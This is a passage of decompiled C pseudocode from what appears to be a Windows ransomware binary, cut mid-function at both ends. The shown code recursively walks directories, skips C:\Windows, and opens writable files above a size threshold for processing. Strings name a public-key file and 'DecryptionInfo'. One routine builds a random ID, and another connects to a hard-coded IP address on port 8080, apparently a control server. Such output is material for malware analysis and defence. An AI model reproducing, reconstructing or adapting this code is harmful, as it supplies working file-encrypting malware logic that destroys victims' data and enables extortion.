      if ( (unsigned int)(v149 - (_DWORD)v70 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = (LPCWSTR *)v71;
    sub_46C87D(v70);
    v149 = 0i64;
    v150 = 0;
  }
  v152 = 2;
  if ( a7 >= 0x10 )
  {
    v72 = a7 + 1;
    v73 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v72 = a7 + 36;
      v73 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v107 = v72;
    sub_46C87D(v73);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v152) = 1;
  if ( a13 >= 8 )
  {
    v74 = 2 * a13 + 2;
    v75 = a8;
    if ( v74 >= 0x1000 )
    {
      v74 = 2 * a13 + 37;
      v75 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v75 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v107 = v74;
    sub_46C87D(v75);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v152) = 0;
  if ( a20 >= 8 )
  {
    v76 = 2 * a20 + 2;
    v77 = a15;
    if ( v76 >= 0x1000 )
    {
      v76 = 2 * a20 + 37;
      v77 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v77 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v107 = v76;
    sub_46C87D(v77);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v152 = -1;
  if ( a26 >= 8 )
  {
    v78 = 2 * a26 + 2;
    v79 = a21;
    if ( v78 >= 0x1000 )
    {
      v78 = 2 * a26 + 37;
      v79 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v79 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v107 = v78;
    sub_46C87D(v79);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 410D6D: variable 'v42' is possibly undefined
// 410EA5: variable 'v49' is possibly undefined
// 410EBC: variable 'v52' is possibly undefined
// 410ED3: variable 'v53' is possibly undefined
// 410EE6: variable 'v54' is possibly undefined
// 410EFB: variable 'v55' is possibly undefined
// 410F3E: variable 'v57' is possibly undefined
// 411123: variable 'v64' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];
// 4CD17C: using guessed type wchar_t aPubkeyTxt[11];
// 4CD194: using guessed type wchar_t aIdoTxt[8];
// 4CD1A4: using guessed type wchar_t aDecryptionInfo[16];

//----- (004114D0) --------------------------------------------------------
int __cdecl sub_4114D0(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // ebx
  _DWORD *v27; // edi
  const WCHAR *v28; // eax
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  __int64 v41; // rdi
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  _DWORD *v45; // eax
  int v46; // ecx
  LPCWSTR *v47; // ecx
  void *v48; // edx
  int v49; // ecx
  char *v50; // eax
  int v51; // ecx
  char v52; // bl
  LPCWSTR *v53; // ecx
  void *v54; // edx
  LPCWSTR *v55; // ecx
  void *v56; // edx
  int v57; // ecx
  HANDLE v58; // esi
  int v59; // edi
  int v60; // esi
  unsigned __int64 v61; // kr00_8
  LPCWSTR *v62; // ecx
  WCHAR *v63; // edx
  void *v64; // esi
  unsigned int v65; // ecx
  int v66; // edx
  _BYTE *v67; // ecx
  unsigned int v68; // edx
  _BYTE *v69; // ecx
  unsigned int v70; // edx
  _BYTE *v71; // ecx
  unsigned int v72; // edx
  _BYTE *v73; // ecx
  int result; // eax
  wchar_t *v75[6]; // [esp-80h] [ebp-414h] BYREF
  _BYTE *v76; // [esp-68h] [ebp-3FCh] BYREF
  int v77; // [esp-64h] [ebp-3F8h] BYREF
  int v78; // [esp-60h] [ebp-3F4h]
  int v79; // [esp-5Ch] [ebp-3F0h]
  int v80; // [esp-58h] [ebp-3ECh]
  unsigned int v81; // [esp-54h] [ebp-3E8h]
  _BYTE *v82; // [esp-50h] [ebp-3E4h] BYREF
  int v83; // [esp-4Ch] [ebp-3E0h] BYREF
  int v84; // [esp-48h] [ebp-3DCh]
  int v85; // [esp-44h] [ebp-3D8h]
  int v86; // [esp-40h] [ebp-3D4h]
  unsigned int v87; // [esp-3Ch] [ebp-3D0h]
  _BYTE *v88; // [esp-38h] [ebp-3CCh] BYREF
  int v89; // [esp-34h] [ebp-3C8h]
  int v90; // [esp-30h] [ebp-3C4h] BYREF
  int v91; // [esp-2Ch] [ebp-3C0h]
  int v92; // [esp-28h] [ebp-3BCh]
  unsigned int v93; // [esp-24h] [ebp-3B8h]
  int v94; // [esp-20h] [ebp-3B4h]
  int v95; // [esp-1Ch] [ebp-3B0h]
  _BYTE *v96; // [esp-18h] [ebp-3ACh] BYREF
  int v97; // [esp-14h] [ebp-3A8h]
  int v98; // [esp-10h] [ebp-3A4h]
  int v99; // [esp-Ch] [ebp-3A0h]
  int v100; // [esp-8h] [ebp-39Ch]
  LPCWSTR *v101; // [esp-4h] [ebp-398h]
  unsigned int v102; // [esp+0h] [ebp-394h] BYREF
  int v103[5]; // [esp+10h] [ebp-384h] BYREF
  unsigned int v104; // [esp+24h] [ebp-370h]
  int v105[5]; // [esp+28h] [ebp-36Ch] BYREF
  unsigned int v106; // [esp+3Ch] [ebp-358h]
  int v107[5]; // [esp+40h] [ebp-354h] BYREF
  unsigned int v108; // [esp+54h] [ebp-340h]
  int v109[5]; // [esp+58h] [ebp-33Ch] BYREF
  unsigned int v110; // [esp+6Ch] [ebp-328h]
  int v111[5]; // [esp+70h] [ebp-324h] BYREF
  unsigned int v112; // [esp+84h] [ebp-310h]
  _BYTE **v113; // [esp+90h] [ebp-304h]
  int v114[4]; // [esp+94h] [ebp-300h] BYREF
  int v115; // [esp+A4h] [ebp-2F0h]
  unsigned int v116; // [esp+A8h] [ebp-2ECh]
  wchar_t **v117; // [esp+ACh] [ebp-2E8h]
  int *v118; // [esp+B0h] [ebp-2E4h]
  int *v119; // [esp+B4h] [ebp-2E0h]
  int *v120; // [esp+B8h] [ebp-2DCh]
  HANDLE hFindFile; // [esp+BCh] [ebp-2D8h]
  int v122; // [esp+C0h] [ebp-2D4h]
  _DWORD *v123; // [esp+C4h] [ebp-2D0h]
  int v124; // [esp+C8h] [ebp-2CCh]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+CCh] [ebp-2C8h] BYREF
  int v126[5]; // [esp+31Ch] [ebp-78h] BYREF
  unsigned int v127; // [esp+330h] [ebp-64h]
  unsigned int v128; // [esp+334h] [ebp-60h]
  LPCWSTR *v129; // [esp+338h] [ebp-5Ch]
  LPCWSTR *v130; // [esp+33Ch] [ebp-58h]
  LPCWSTR *v131; // [esp+340h] [ebp-54h]
  LPCWSTR *v132; // [esp+344h] [ebp-50h]
  LPCWSTR *v133; // [esp+348h] [ebp-4Ch]
  LPCWSTR *v134; // [esp+34Ch] [ebp-48h]
  LPCWSTR *v135; // [esp+350h] [ebp-44h]
  LPCWSTR *v136; // [esp+354h] [ebp-40h]
  int v137; // [esp+358h] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+35Ch] [ebp-38h] BYREF
  unsigned int v139; // [esp+370h] [ebp-24h]
  unsigned __int64 v140; // [esp+374h] [ebp-20h] BYREF
  int v141; // [esp+37Ch] [ebp-18h]
  int *v142; // [esp+384h] [ebp-10h]
  int v143; // [esp+390h] [ebp-4h]
  int savedregs; // [esp+394h] [ebp+0h] BYREF

  v142 = (int *)&v102;
  v123 = a1;
  v122 = a14;
  v26 = 0;
  v124 = 0;
  v143 = 5;
  v140 = 0i64;
  v141 = 0;
  v27 = a1;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v143) = 6;
  v28 = (const WCHAR *)lpFileName;
  if ( v139 >= 8 )
    v28 = lpFileName[0];
  hFindFile = FindFirstFileW(v28, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  do
  {
    v29 = sub_4194E0((int)v107, FindFileData.cFileName);
    LOBYTE(v143) = 7;
    v30 = (char *)sub_4229A0((int)v109, v27, (unsigned __int16 *)"\\");
    LOBYTE(v143) = 8;
    v31 = sub_421BF0((int)v111, v30, v29);
    LOBYTE(v143) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v143) = 8;
    if ( v112 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v112 + 2);
      v136 = v32;
      v33 = (void *)v111[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v112 + 37);
        v136 = v32;
        v33 = *(void **)(v111[0] - 4);
        if ( (unsigned int)(v111[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v32;
      sub_46C87D(v33);
    }
    v111[4] = 0;
    v112 = 7;
    LOWORD(v111[0]) = 0;
    LOBYTE(v143) = 7;
    if ( v110 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v110 + 2);
      v135 = v34;
      v35 = (void *)v109[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v110 + 37);
        v135 = v34;
        v35 = *(void **)(v109[0] - 4);
        if ( (unsigned int)(v109[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v34;
      sub_46C87D(v35);
    }
    v109[4] = 0;
    v110 = 7;
    LOWORD(v109[0]) = 0;
    LOBYTE(v143) = 6;
    if ( v108 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v108 + 2);
      v134 = v36;
      v37 = (void *)v107[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v108 + 37);
        v134 = v36;
        v37 = *(void **)(v107[0] - 4);
        if ( (unsigned int)(v107[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v101 = v36;
      sub_46C87D(v37);
    }
    v107[4] = 0;
    v108 = 7;
    LOWORD(v107[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v57) == -1 )
      {
        v101 = lpFileName;
        if ( v141 == HIDWORD(v140) )
        {
          sub_423CD0((int *)&v140, SHIDWORD(v140), v101);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v140), v101);
          HIDWORD(v140) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v143) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v139 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( v39 )
      {
        fclose(v39);
        v40 = (WCHAR *)sub_421E60((int)v105, (unsigned int *)lpFileName, (int)v101);
        LOBYTE(v143) = 11;
        v41 = sub_404B60(v40);
        LOBYTE(v143) = 10;
        v42 = v106;
        if ( v106 >= 8 )
        {
          v43 = (LPCWSTR *)(2 * v106 + 2);
          v133 = v43;
          v44 = (void *)v105[0];
          if ( (unsigned int)v43 >= 0x1000 )
          {
            v43 = (LPCWSTR *)(2 * v106 + 37);
            v133 = v43;
            v44 = *(void **)(v105[0] - 4);
            if ( (unsigned int)(v105[0] - (_DWORD)v44 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v43;
          sub_46C87D(v44);
        }
        v105[4] = 0;
        v106 = 7;
        LOWORD(v105[0]) = 0;
        v45 = (_DWORD *)sub_421E60((int)v103, (unsigned int *)lpFileName, v42);
        LOBYTE(v143) = 13;
        sub_404120(v45, (int)v126);
        LOBYTE(v143) = 15;
        v46 = v104;
        if ( v104 >= 8 )
        {
          v47 = (LPCWSTR *)(2 * v104 + 2);
          v132 = v47;
          v48 = (void *)v103[0];
          if ( (unsigned int)v47 >= 0x1000 )
          {
            v47 = (LPCWSTR *)(2 * v104 + 37);
            v132 = v47;
            v48 = *(void **)(v103[0] - 4);
            if ( (unsigned int)(v103[0] - (_DWORD)v48 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v47;
          sub_46C87D(v48);
        }
        v103[4] = 0;
        v104 = 7;
        LOWORD(v103[0]) = 0;
        if ( v41 <= 600257 || sub_4191C0((char *)lpFileName, L"C:\\Windows", v46) != -1 )
          goto LABEL_37;
        sub_421E60((int)v114, (unsigned int *)&a21, v49);
        LOBYTE(v143) = 17;
        v124 = v26 | 1;
        v50 = (char *)v114;
        if ( v116 >= 8 )
          v50 = (char *)v114[0];
        if ( sub_403F60(v126, v50, v115) && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v51) == -1 )
          v52 = 1;
        else
LABEL_37:
          v52 = 0;
        v143 = 15;
        if ( (v124 & 1) != 0 )
        {
          v124 &= ~1u;
          LOBYTE(v143) = 15;
          if ( v116 >= 8 )
          {
            v53 = (LPCWSTR *)(2 * v116 + 2);
            v131 = v53;
            v54 = (void *)v114[0];
            if ( (unsigned int)v53 >= 0x1000 )
            {
              v53 = (LPCWSTR *)(2 * v116 + 37);
              v131 = v53;
              v54 = *(void **)(v114[0] - 4);
              if ( (unsigned int)(v114[0] - (_DWORD)v54 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            v101 = v53;
            sub_46C87D(v54);
          }
          v115 = 0;
          v116 = 7;
          LOWORD(v114[0]) = 0;
        }
        if ( v52 )
        {
          v113 = &v96;
          sub_419530(&v96, &a21);
          LOBYTE(v143) = 19;
          v120 = (int *)&v88;
          sub_419530(&v88, &a8);
          LOBYTE(v143) = 20;
          v119 = (int *)&v82;
          sub_419530(&v82, &a15);
          LOBYTE(v143) = 21;
          v118 = (int *)&v76;
          sub_419BE0(&v76, &a2);
          LOBYTE(v143) = 22;
          v117 = v75;
          sub_419530(v75, lpFileName);
          LOBYTE(v143) = 15;
          sub_40AAB0(
            v122,
            (int)&savedregs,
            v75[0],
            (int)v75[1],
            (int)v75[2],
            (int)v75[3],
            (int)v75[4],
            (unsigned int)v75[5],
            v76,
            v77,
            v78,
            v79,
            v80,
            v81,
            v82,
            v83,
            v84,
            v85,
            v86,
            v87,
            v88,
            v89,
            v90,
            v91,
            v92,
            v93,
            v94,
            v95,
            v96,
            v97,
            v98,
            v99,
            v100,
            (unsigned int)v101);
        }
        LOBYTE(v143) = 10;
        if ( v127 >= 8 )
        {
          v55 = (LPCWSTR *)(2 * v127 + 2);
          v130 = v55;
          v56 = (void *)v126[0];
          if ( (unsigned int)v55 >= 0x1000 )
          {
            v55 = (LPCWSTR *)(2 * v127 + 37);
            v130 = v55;
            v56 = *(void **)(v126[0] - 4);
            if ( (unsigned int)(v126[0] - (_DWORD)v56 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v101 = v55;
          sub_46C87D(v56);
        }
        v126[4] = 0;
        v127 = 7;
        LOWORD(v126[0]) = 0;
        v143 = 6;
        v26 = v124;
        v27 = v123;
      }
      else
      {
        LOBYTE(v143) = 6;
      }
    }
    v58 = hFindFile;
  }
  while ( FindNextFileW(hFindFile, &FindFileData) );
  FindClose(v58);
  v61 = v140;
  v59 = HIDWORD(v61);
  v60 = v61;
  v137 = v140;
  while ( v60 != v59 )
  {
    v117 = (wchar_t **)&v96;
    sub_419530(&v96, &a21);
    LOBYTE(v143) = 26;
    v118 = &v90;
    sub_419530(&v90, &a15);
    LOBYTE(v143) = 27;
    v89 = v122;
    v119 = &v83;
    sub_419530(&v83, &a8);
    LOBYTE(v143) = 28;
    v120 = &v77;
    sub_419BE0(&v77, &a2);
    LOBYTE(v143) = 6;
    sub_4114D0(
      v60,
      v77,
      v78,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101);
    v60 += 24;
    v137 = v60;
  }
  LOBYTE(v143) = 5;
  if ( v139 >= 8 )
  {
    v62 = (LPCWSTR *)(2 * v139 + 2);
    v129 = v62;
    v63 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v62 >= 0x1000 )
    {
      v62 = (LPCWSTR *)(2 * v139 + 37);
      v129 = v62;
      v63 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v63 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v101 = v62;
    sub_46C87D(v63);
  }
  lpFileName[4] = 0;
  v139 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v143) = 4;
  if ( (_DWORD)v140 )
  {
    v101 = (LPCWSTR *)v140;
    sub_425130(v140, SHIDWORD(v140));
    v64 = (void *)v140;
    v65 = 24 * ((v141 - (int)v140) / 24);
    v128 = v65;
    if ( v65 >= 0x1000 )
    {
      v65 += 35;
      v128 = v65;
      v64 = *(void **)(v140 - 4);
      if ( (unsigned int)(v140 - (_DWORD)v64 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v101 = (LPCWSTR *)v65;
    sub_46C87D(v64);
    v140 = 0i64;
    v141 = 0;
  }
  v143 = 2;
  if ( a7 >= 0x10 )
  {
    v66 = a7 + 1;
    v67 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v66 = a7 + 36;
      v67 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v67 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v66;
    sub_46C87D(v67);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v143) = 1;
  if ( a13 >= 8 )
  {
    v68 = 2 * a13 + 2;
    v69 = a8;
    if ( v68 >= 0x1000 )
    {
      v68 = 2 * a13 + 37;
      v69 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v68;
    sub_46C87D(v69);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v143) = 0;
  if ( a20 >= 8 )
  {
    v70 = 2 * a20 + 2;
    v71 = a15;
    if ( v70 >= 0x1000 )
    {
      v70 = 2 * a20 + 37;
      v71 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v71 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v70;
    sub_46C87D(v71);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v143 = -1;
  if ( a26 >= 8 )
  {
    v72 = 2 * a26 + 2;
    v73 = a21;
    if ( v72 >= 0x1000 )
    {
      v72 = 2 * a26 + 37;
      v73 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v102 = v72;
    sub_46C87D(v73);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 4117E3: variable 'v42' is possibly undefined
// 411879: variable 'v46' is possibly undefined
// 41188E: variable 'v49' is possibly undefined
// 4118D1: variable 'v51' is possibly undefined
// 411ABA: variable 'v57' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (00411E60) --------------------------------------------------------
void *__thiscall sub_411E60(void *this)
{
  unsigned int v2; // eax
  void **v3; // ecx
  unsigned int v4; // eax
  void **v5; // ecx
  void *v6; // ecx
  int v8[1250]; // [esp+14h] [ebp-13B0h] BYREF
  void *v9[4]; // [esp+139Ch] [ebp-28h] BYREF
  int v10; // [esp+13ACh] [ebp-18h]
  unsigned int v11; // [esp+13B0h] [ebp-14h]
  int v12; // [esp+13C0h] [ebp-4h]

  v10 = 0;
  v11 = 15;
  LOBYTE(v9[0]) = 0;
  sub_41EF80(v9, "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM", 0x58u);
  v12 = 1;
  v2 = std::_Random_device();
  sub_417130(v8, v2);
  v3 = v9;
  if ( v11 >= 0x10 )
    v3 = (void **)v9[0];
  v4 = (unsigned int)v3 + v10;
  v5 = v9;
  if ( v11 >= 0x10 )
    v5 = (void **)v9[0];
  sub_423200((int)v5, v4);
  sub_419610(v9, (int)this, 0, 5u);
  LOBYTE(v12) = 0;
  if ( v11 >= 0x10 )
  {
    v6 = v9[0];
    if ( v11 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v9[0] - 1);
      if ( (unsigned int)(v9[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  v10 = 0;
  v11 = 15;
  LOBYTE(v9[0]) = 0;
  return this;
}
// 46A5B8: using guessed type unsigned int __cdecl std::_Random_device();
// 411E60: using guessed type int var_13B0[1250];

//----- (00411FA0) --------------------------------------------------------
_DWORD *__cdecl sub_411FA0(
        __int64 a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        char *a14,
        int a15,
        int a16,
        int a17,
        int a18,
        unsigned int a19)
{
  ULONG v19; // ecx
  _DWORD *v20; // esi
  void *v21; // edx
  void *v22; // edx
  void *v23; // edx
  void *v24; // edx
  void *v25; // edx
  void *v26; // edx
  char *v27; // eax
  char *v28; // eax
  char *v29; // eax
  char *v30; // eax
  char *v31; // eax
  char *v32; // eax
  char *v33; // eax
  char *v34; // eax
  char *v35; // eax
  int v36; // eax
  void *v37; // edx
  void *v38; // edx
  void *v39; // edx
  void *v40; // edx
  void *v41; // edx
  void *v42; // edx
  void *v43; // edx
  void *v44; // edx
  void *v45; // edx
  void *v46; // edx
  char *v47; // eax
  int v48; // ecx
  void *v49; // edx
  void *v50; // edx
  _BYTE *v51; // edx
  _BYTE *v52; // edx
  _BYTE *v53; // edx
  char *v54; // edx
  char *v55; // eax
  char *v57; // ecx
  int v58; // eax
  void *v59; // edx
  void *v60; // edx
  _BYTE *v61; // edx
  _BYTE *v62; // edx
  _BYTE *v63; // edx
  int v64; // [esp+0h] [ebp-338h] BYREF
  int v65[5]; // [esp+10h] [ebp-328h] BYREF
  unsigned int v66; // [esp+24h] [ebp-314h]
  int v67[5]; // [esp+28h] [ebp-310h] BYREF
  unsigned int v68; // [esp+3Ch] [ebp-2FCh]
  int v69[5]; // [esp+40h] [ebp-2F8h] BYREF
  unsigned int v70; // [esp+54h] [ebp-2E4h]
  int v71[5]; // [esp+58h] [ebp-2E0h] BYREF
  unsigned int v72; // [esp+6Ch] [ebp-2CCh]
  int v73[5]; // [esp+70h] [ebp-2C8h] BYREF
  unsigned int v74; // [esp+84h] [ebp-2B4h]
  int v75[5]; // [esp+88h] [ebp-2B0h] BYREF
  unsigned int v76; // [esp+9Ch] [ebp-29Ch]
  int v77[5]; // [esp+A0h] [ebp-298h] BYREF
  unsigned int v78; // [esp+B4h] [ebp-284h]
  int v79[5]; // [esp+B8h] [ebp-280h] BYREF
  unsigned int v80; // [esp+CCh] [ebp-26Ch]
  int v81[5]; // [esp+D0h] [ebp-268h] BYREF
  unsigned int v82; // [esp+E4h] [ebp-254h]
  int v83[5]; // [esp+E8h] [ebp-250h] BYREF
  unsigned int v84; // [esp+FCh] [ebp-23Ch]
  size_t v85[5]; // [esp+100h] [ebp-238h] BYREF
  unsigned int v86; // [esp+114h] [ebp-224h]
  int v87[5]; // [esp+118h] [ebp-220h] BYREF
  unsigned int v88; // [esp+12Ch] [ebp-20Ch]
  size_t v89[5]; // [esp+130h] [ebp-208h] BYREF
  unsigned int v90; // [esp+144h] [ebp-1F4h]
  size_t v91[5]; // [esp+148h] [ebp-1F0h] BYREF
  unsigned int v92; // [esp+15Ch] [ebp-1DCh]
  size_t v93[5]; // [esp+160h] [ebp-1D8h] BYREF
  unsigned int v94; // [esp+174h] [ebp-1C4h]
  size_t v95[5]; // [esp+178h] [ebp-1C0h] BYREF
  unsigned int v96; // [esp+18Ch] [ebp-1ACh]
  ULONG v97; // [esp+190h] [ebp-1A8h]
  int v98; // [esp+194h] [ebp-1A4h]
  size_t v99[18]; // [esp+198h] [ebp-1A0h] BYREF
  __int64 v100; // [esp+1E0h] [ebp-158h] BYREF
  void *v101[11]; // [esp+1ECh] [ebp-14Ch] BYREF
  _DWORD *v102[19]; // [esp+218h] [ebp-120h] BYREF
  struct in_addr v103[2]; // [esp+264h] [ebp-D4h] BYREF
  int v104[4]; // [esp+26Ch] [ebp-CCh] BYREF
  int v105; // [esp+27Ch] [ebp-BCh]
  unsigned int v106; // [esp+280h] [ebp-B8h]
  unsigned int v107; // [esp+284h] [ebp-B4h]
  unsigned int v108; // [esp+288h] [ebp-B0h]
  unsigned int v109; // [esp+28Ch] [ebp-ACh]
  unsigned int v110; // [esp+290h] [ebp-A8h]
  unsigned int v111; // [esp+294h] [ebp-A4h]
  unsigned int v112; // [esp+298h] [ebp-A0h]
  unsigned int v113; // [esp+29Ch] [ebp-9Ch]
  unsigned int v114; // [esp+2A0h] [ebp-98h]
  unsigned int v115; // [esp+2A4h] [ebp-94h]
  unsigned int v116; // [esp+2A8h] [ebp-90h]
  unsigned int v117; // [esp+2ACh] [ebp-8Ch]
  unsigned int v118; // [esp+2B0h] [ebp-88h]
  unsigned int v119; // [esp+2B4h] [ebp-84h]
  unsigned int v120; // [esp+2B8h] [ebp-80h]
  unsigned int v121; // [esp+2BCh] [ebp-7Ch]
  unsigned int v122; // [esp+2C0h] [ebp-78h]
  unsigned int v123; // [esp+2C4h] [ebp-74h]
  _BYTE *v124; // [esp+2C8h] [ebp-70h] BYREF
  int v125; // [esp+2D8h] [ebp-60h]
  unsigned int v126; // [esp+2DCh] [ebp-5Ch]
  unsigned int v127; // [esp+2E0h] [ebp-58h]
  unsigned int v128; // [esp+2E4h] [ebp-54h]
  unsigned int v129; // [esp+2E8h] [ebp-50h]
  unsigned int v130; // [esp+2ECh] [ebp-4Ch]
  unsigned int v131; // [esp+2F0h] [ebp-48h]
  unsigned int v132; // [esp+2F4h] [ebp-44h]
  unsigned int v133; // [esp+2F8h] [ebp-40h]
  unsigned int v134; // [esp+2FCh] [ebp-3Ch]
  unsigned int v135; // [esp+300h] [ebp-38h]
  unsigned int v136; // [esp+304h] [ebp-34h]
  int v137[4]; // [esp+308h] [ebp-30h] BYREF
  int v138; // [esp+318h] [ebp-20h]
  unsigned int v139; // [esp+31Ch] [ebp-1Ch]
  unsigned int v140; // [esp+320h] [ebp-18h]
  int *v141; // [esp+328h] [ebp-10h]
  int v142; // [esp+334h] [ebp-4h]

  v141 = &v64;
  v20 = (_DWORD *)v19;
  v103[1].S_un.S_addr = v19;
  v97 = v19;
  v98 = 0;
  v142 = 4;
  sub_403B30(a1);
  LOBYTE(v142) = 5;
  sub_468A50(&v100, 4000);
  sub_419B80((int)v137, "active");
  LOBYTE(v142) = 6;
  sub_419B80((int)v104, "detive");
  LOBYTE(v142) = 7;
  sub_428910(v103, qword_4F0148);
  sub_42A6D0((int)v99);
  LOBYTE(v142) = 8;
  memset(v102, 0, 0x44u);
  sub_419B80((int)v93, &unk_4CCC25);
  LOBYTE(v142) = 9;
  sub_419B80((int)v95, "/");
  LOBYTE(v142) = 10;
  sub_42A740((char *)v102, v95, 0, v93);
  LOBYTE(v142) = 12;
  if ( v96 >= 0x10 )
  {
    v136 = v96 + 1;
    v21 = (void *)v95[0];
    if ( v96 + 1 >= 0x1000 )
    {
      v136 = v96 + 36;
      v21 = *(void **)(v95[0] - 4);
      if ( v95[0] - (unsigned int)v21 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v21);
  }
  v95[4] = 0;
  v96 = 15;
  LOBYTE(v95[0]) = 0;
  LOBYTE(v142) = 13;
  if ( v94 >= 0x10 )
  {
    v135 = v94 + 1;
    v22 = (void *)v93[0];
    if ( v94 + 1 >= 0x1000 )
    {
      v135 = v94 + 36;
      v22 = *(void **)(v93[0] - 4);
      if ( v93[0] - (unsigned int)v22 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v22);
  }
  v93[4] = 0;
  v94 = 15;
  LOBYTE(v93[0]) = 0;
  sub_419B80((int)v91, "80.82.69.52");
  LOBYTE(v142) = 14;
  sub_431C00((int)v99, v91, 8080);
  LOBYTE(v142) = 13;
  if ( v92 >= 0x10 )
  {
    v134 = v92 + 1;
    v23 = (void *)v91[0];
